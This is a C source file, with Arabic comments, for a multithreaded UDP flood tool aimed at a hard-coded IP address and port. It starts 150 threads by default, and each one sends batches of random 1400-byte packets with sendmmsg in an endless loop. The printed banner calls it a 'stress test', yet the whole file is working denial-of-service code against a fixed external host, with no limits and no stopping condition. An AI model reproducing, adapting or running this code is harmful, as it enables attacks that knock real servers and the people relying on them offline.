#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <sys/uio.h>

#define PACKET_SIZE 1400
#define BATCH_SIZE 64  // عدد الحزم المرسلة في الدفعة الواحدة لتجاوز اختناق النظام
#define TARGET_IP "193.111.250.244"
#define TARGET_PORT 7026

struct thread_data {
    char ip[16];
    int port;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in serv_addr;
    
    // مصفوفة لتخزين الحزم وإرسالها دفعة واحدة باستخدام sendmmsg
    char buffers[BATCH_SIZE][PACKET_SIZE];
    struct iovec iovecs[BATCH_SIZE];
    struct mmsghdr msgs[BATCH_SIZE];
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        free(data);
        pthread_exit(NULL);
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(data->port);
    serv_addr.sin_addr.s_addr = inet_addr(data->ip);

    unsigned int seed = time(NULL) ^ pthread_self();

    // تهيئة دفعة الحزم مسبقاً لتوفير وقت المعالج داخل حلقة الإرسال
    for (int b = 0; b < BATCH_SIZE; b++) {
        for (int i = 0; i < PACKET_SIZE; i++) {
            buffers[b][i] = rand_r(&seed) % 256;
        }
        iovecs[b].iov_base = buffers[b];
        iovecs[b].iov_len = PACKET_SIZE;

        memset(&msgs[b], 0, sizeof(msgs[b]));
        msgs[b].msg_hdr.msg_name = &serv_addr;
        msgs[b].msg_hdr.msg_namelen = sizeof(serv_addr);
        msgs[b].msg_hdr.msg_iov = &iovecs[b];
        msgs[b].msg_hdr.msg_iovlen = 1;
    }

    // حلقة إرسال دفعات صاروخية مستمرة
    while (1) {
        sendmmsg(sock, msgs, BATCH_SIZE, 0);
    }

    close(sock);
    free(data);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    int threads_count = 150; // رفع عدد الخيوط الافتراضي لزيادة الكثافة
    
    if(argc == 2) {
        threads_count = atoi(argv[1]);
    }

    printf("[*] Starting MAXIMUM-POWER Batch Stress Test on %s:%d with %d threads...\n", TARGET_IP, TARGET_PORT, threads_count);

    pthread_t *threads = malloc(threads_count * sizeof(pthread_t));
    if (!threads) {
        perror("Failed to allocate memory for threads");
        return 1;
    }

    for(int i = 0; i < threads_count; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        if (!data) continue;
        snprintf(data->ip, sizeof(data->ip), "%s", TARGET_IP);
        data->port = TARGET_PORT;

        pthread_create(&threads[i], NULL, attack, (void *)data);
    }

    for(int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    return 0;
}
